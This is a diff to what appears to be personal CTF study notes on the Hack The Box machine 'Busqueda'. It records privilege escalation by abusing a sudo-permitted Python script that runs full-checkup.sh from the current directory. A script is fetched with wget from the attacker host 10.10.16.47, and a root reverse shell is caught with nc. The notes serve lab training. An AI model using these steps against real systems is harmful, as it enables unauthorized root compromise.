@@ -74,7 +74,100 @@ CONTAINER ID   IMAGE                COMMAND                  CREATED        STAT
 960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
 f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
 
+```
+svc@busqueda:/opt/scripts$ sudo -l
+[sudo] password for svc: 
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
 
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+
+```
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
+
+
+```
+svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+[=] Docker conteainers
+{
+  "/gitea": "running"
+}
+{
+  "/mysql_db": "running"
+}
+
+[=] Docker port mappings
+{
+  "22/tcp": [
+    {
+      "HostIp": "127.0.0.1",
+      "HostPort": "222"
+    }
+  ],
+  "3000/tcp": [
+    {
+      "HostIp": "127.0.0.1",
+      "HostPort": "3000"
+    }
+  ]
+}
+
+[=] Apache webhosts
+[+] searcher.htb is up
+[+] gitea.searcher.htb is up
+
+[=] PM2 processes
+┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
+│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
+├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
+│ 0   │ app    │ default     │ N/A     │ fork    │ 1645     │ 11h    │ 0    │ online    │ 0%       │ 29.6mb   │ svc      │ disabled │
+└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
+
+[+] Done!
+```
+```
+
+`sudo /usr/bin/python3 /opt/scripts/system-checkup.py ./full-checkup.sh`
+
+```
+svc@busqueda:~/folder$ wget http://10.10.16.47:8000/full-checkup.sh
+--2023-07-24 11:58:00--  http://10.10.16.47:8000/full-checkup.sh
+Connecting to 10.10.16.47:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 64 [text/x-sh]
+Saving to: ‘full-checkup.sh’
+
+full-checkup.s 100%      64  --.-KB/s    in 0s          
+
+2023-07-24 11:58:02 (5.94 MB/s) - ‘full-checkup.sh’ saved [64/64]
+
+svc@busqueda:~/folder$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+Something went wrong
+svc@busqueda:~/folder$ ls -al
+total 12
+drwxrwxr-x 2 svc svc 4096 Jul 24 11:58 .
+drwxr-x--- 7 svc svc 4096 Jul 24 11:45 ..
+-rw-rw-r-- 1 svc svc   64 Jul 24 11:57 full-checkup.sh
+svc@busqueda:~/folder$ chmod +x full_checkup.sh
+chmod: cannot access 'full_checkup.sh': No such file or directory
+svc@busqueda:~/folder$ chmod +x full-checkup.sh
+svc@busqueda:~/folder$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
+
+
+```
+──(kali㉿kali)-[~/codeplay/oscp]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.47] from searcher.htb [10.10.11.208] 41246
+# cat /root/root.txt
+3ddb5506c2ca27ef1f2a6b89fb69c195
+```
 # learning
 
 1. read information specific to the box
